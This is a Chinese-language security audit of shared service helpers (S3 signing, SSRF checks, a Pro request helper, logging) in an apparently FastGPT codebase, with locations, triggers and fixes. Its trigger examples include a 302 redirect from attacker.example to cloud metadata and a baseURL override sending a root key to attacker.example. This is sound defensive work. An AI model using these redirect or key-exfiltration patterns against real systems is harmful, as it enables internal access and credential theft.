# packages/service 共享服务潜在 Bug 分析

## 范围

分析范围包括 `packages/service` 中被多个项目复用的 S3、HTTP 请求、LLM 请求、Plus 服务请求 helper。该类问题不一定只属于单个 project，但会被 `projects/app`、工作流、知识库、MCP 或部署链路放大。

## Findings

### 高：文本替换工具会把任意私有 S3 key 签成下载 URL，缺少当前资源归属上下文

- 位置：
  - `packages/service/core/dataset/utils.ts:60`
  - `packages/service/core/dataset/utils.ts:70`
- 典型调用：
  - `projects/app/src/pages/api/core/dataset/data/v2/list.ts:57`
  - `projects/app/src/pages/api/core/dataset/collection/export.ts:109`
  - `packages/service/core/dataset/search/controller.ts:931`
  - `packages/service/core/workflow/utils/file.ts:210`

#### 问题

`replaceS3KeyToPreviewUrl` 会扫描 Markdown 中的 `dataset/...` 或 `chat/...` 私有对象 key，只要 `isS3ObjectKey` 判断来源合法，就直接调用 `jwtSignS3DownloadToken` 生成私有桶下载 URL。该函数没有接收当前 `datasetId`、`collectionId`、`appId`、`chatId` 或 `uid` 之类的授权 scope。

#### 触发场景

用户对某个知识库有写权限时，在 q/a 文本中写入另一个资源的私有 key，例如 `![x](dataset/<otherDatasetId>/secret.png)` 或 `![x](chat/<appId>/<uid>/<chatId>/secret.pdf)`。后续列表、搜索、预览或导出链路调用该工具时，会把该 key 签成可访问 URL。

#### 影响

只要攻击者知道私有对象 key，就可能借知识库文本渲染/导出链路获得下载签名，绕过原本应绑定到知识库、会话或用户的资源归属边界。

#### 建议修复

- 不要在纯文本替换工具里直接代签私有对象。
- 将函数改为显式传入允许的 key scope，例如当前 `datasetId`、允许的 collection 文件前缀，chat 场景传 `appId/uId/chatId`。
- 对不在 scope 内的 key 保持原文或返回占位，不生成下载 URL。
- 增加“注入其他 dataset/chat key 不会被签名”的回归测试。

### 高：SSRF 校验只检查初始 URL，axios 跟随重定向后可能访问内网地址

- 位置：
  - `packages/service/common/api/axios.ts:8`
  - `packages/service/core/app/http.ts:155`
  - `packages/service/core/app/http.ts:169`

#### 问题

通用 safe axios 的 request interceptor 会在请求发起前检查 `config.url/baseURL` 得到的初始 URL。HTTP Tool 也会在 `runHTTPTool` 里先检查 `fullUrl`。但 axios 默认会跟随 3xx 重定向，重定向后的 `Location` 不会再次走当前的 `isInternalAddress` 校验。

#### 触发场景

用户配置 HTTP Tool 请求公网地址 `https://attacker.example/redirect`，该地址返回：

```http
302 Location: http://169.254.169.254/latest/meta-data/
```

或跳转到 `10.x`、`172.16.x`、`192.168.x` 等内网地址。初始公网 URL 通过校验后，后续跳转仍可能由 axios 执行。

#### 影响

工作流 HTTP Tool 等用户可控出站请求可被用作 SSRF 跳板，访问 metadata、localhost 或内网服务。该问题会与部署模板默认关闭 `CHECK_INTERNAL_IP` 叠加。

#### 建议修复

- 对需要 SSRF 防护的 axios 实例设置 `maxRedirects: 0`，由业务显式处理跳转。
- 或使用 `beforeRedirect` / 自定义 transport 对每次跳转目标重新执行 `isInternalAddress` 和协议白名单校验。
- 增加“公网 302 到 metadata/内网被拒绝”的测试。

### 中：Plus 请求 helper 允许 config 覆盖 baseURL，存在高权限 rootkey 外发隐患

- 位置：
  - `packages/service/common/api/plusRequest.ts:73`
  - `packages/service/common/api/plusRequest.ts:111`
  - `packages/service/common/api/plusRequest.ts:118`

#### 问题

Plus 请求实例默认携带 `rootkey: process.env.ROOT_KEY`，并显式关闭 SSRF 拦截。`GET/POST/PUT/DELETE` 这组 helper 会先设置 `baseURL: FastGPTProUrl`，再展开 `...config`：

```ts
return instance.request({
  baseURL: FastGPTProUrl,
  url,
  method,
  ...
  ...config
});
```

运行时如果调用方传入 `config.baseURL`，会覆盖目标域名。虽然当前 TypeScript `ConfigType` 没声明 `baseURL`，但运行时对象仍可携带该字段。

#### 触发场景

后续复用方或通过 `as any` 传入：

```ts
POST('/any', {}, { baseURL: 'https://attacker.example' } as any);
```

`assertRelativePath(url)` 只检查 `url`，最终请求会发往 attacker，并携带默认 rootkey。

#### 影响

这是 helper 级别的安全脚枪。当前未确认有用户输入能直接控制 `config.baseURL`，但一旦被业务复用，可能造成 ROOT_KEY 泄露到非 Pro 域名。

#### 建议修复

- 白名单拷贝 `timeout`、`headers`、`hold` 等允许字段，拒绝 `baseURL/url/proxy/httpAgent/httpsAgent`。
- 或把 `...config` 放前面，最后强制写回 `baseURL: FastGPTProUrl`，并检测到 `baseURL` 时直接抛错。
- 为 `plusRequest` 增加“config 不能覆盖 baseURL”的单元测试。

### 中：S3 removeObject 没有 await deleteObject，调用方无法感知删除失败

- 位置：`packages/service/common/s3/buckets/base.ts:133`

#### 问题

`removeObject` 声明为 `async`，但内部没有 `await` 或 `return`：

```ts
async removeObject(objectKey: string): Promise<void> {
  this.client.deleteObject({ key: objectKey }).catch(...)
}
```

调用方 `await bucket.removeObject(key)` 会立即 resolve。若底层删除返回非 NotFound 错误，catch 中的 `throw err` 不会传递给调用方，还可能成为未处理 rejection。

#### 触发场景

S3/MinIO 删除失败、权限错误、网络异常或对象存储超时时，调用方仍按删除成功继续执行。

#### 影响

删除流程、迁移流程或清理任务可能产生孤儿文件，审计日志和数据库状态也会误判对象已经删除。

#### 建议修复

改为：

```ts
try {
  await this.client.deleteObject({ key: objectKey });
} catch (err) {
  if (isFileNotFoundError(err)) return;
  logger.error(...);
  throw err;
}
```

并增加 deleteObject reject 时 `removeObject` 也 reject 的测试。

### 中：LLM 调用失败日志记录完整请求体，可能泄露 prompt、上下文和工具参数

- 位置：
  - `packages/service/core/ai/llm/request.ts:874`
  - `packages/service/core/ai/llm/request.ts:882`

#### 问题

模型调用失败时会把完整 `body` 记录到 warn/error 日志：

```ts
logger.warn('User AI API error', { baseUrl, request: body, error });
logger.error('LLM response error', { request: body, error });
```

`body` 可能包含用户消息、知识库引用、工具参数、文件 URL、业务密钥或个人数据。

#### 触发场景

模型服务 500、超时、鉴权失败或网络错误时，完整 prompt 和上下文进入生产日志。

#### 影响

敏感数据进入日志系统、错误平台和运维检索链路，扩大隐私和合规风险。

#### 建议修复

- 默认只记录 `model`、stream、message count、requestId、错误码和 provider。
- 对用户消息、tools、headers 和文件 URL 做脱敏与长度截断。
- 如需完整 body，应使用受配置开关保护的 debug 日志，并限制保留时间。

### 中：Rerank 请求失败日志记录原始 AxiosError，可能泄露 Authorization 和文档内容

- 位置：
  - `packages/service/core/ai/rerank/index.ts:98`
  - `packages/service/core/ai/rerank/index.ts:107`
  - `packages/service/core/ai/rerank/index.ts:154`
  - `packages/service/core/ai/rerank/index.ts:155`

#### 问题

Rerank 请求会把 query、documents 和 Authorization 发送给模型服务：

```ts
headers: {
  Authorization: model.requestAuth ? `Bearer ${model.requestAuth}` : authorization,
  ...headers
}
```

失败时 catch 中直接记录原始 `err`：

```ts
logger.error('Rerank request failed', { error: err });
```

AxiosError 通常会携带 `config.headers`、`config.data`、请求 URL 和响应体。这里的 `config.data` 可能包含待 rerank 的用户 query 和知识库文本，headers 中可能包含模型 API Key。

#### 触发场景

Rerank 服务超时、返回 4xx/5xx、网络异常或鉴权失败。

#### 影响

模型密钥、用户检索问题和知识库片段进入日志系统，造成密钥泄露和数据合规风险。

#### 建议修复

- 使用统一的 AxiosError 脱敏 serializer，只保留 status、code、provider、duration、requestId。
- 删除或截断 `config.data`，对 headers 中的 `authorization/api-key/cookie` 等字段脱敏。
- 为 Rerank 和 LLM 请求共用同一套安全日志工具。

### 中：代理环境变量启动时明文输出，可能泄露代理凭据

- 位置：
  - `packages/service/common/proxy/index.ts:7`
  - `packages/service/common/proxy/index.ts:8`
  - `packages/service/common/proxy/index.ts:9`
  - `packages/service/common/proxy/index.ts:10`

#### 问题

代理初始化会直接打印完整代理环境变量：

```ts
console.info('HTTP_PROXY: %s', process.env.HTTP_PROXY);
console.info('HTTPS_PROXY: %s', process.env.HTTPS_PROXY);
console.info('NO_PROXY: %s', process.env.NO_PROXY);
console.info('ALL_PROXY: %s', process.env.ALL_PROXY);
```

企业代理 URL 常见格式包含用户名密码，例如 `http://user:password@proxy.example:8080`。

#### 触发场景

生产环境通过带账号密码的 `HTTP_PROXY`、`HTTPS_PROXY` 或 `ALL_PROXY` 接入出站代理，应用启动或重启。

#### 影响

代理凭据进入 stdout、容器日志、日志平台或工单截图，可能被用于绕过网络出口控制。

#### 建议修复

- 不打印完整代理 URL，只打印是否启用和 host。
- 对 URL userinfo、token、password 做脱敏。
- 避免默认输出 `NO_PROXY` 的完整内网域名清单，必要时只在 debug 模式输出脱敏版本。
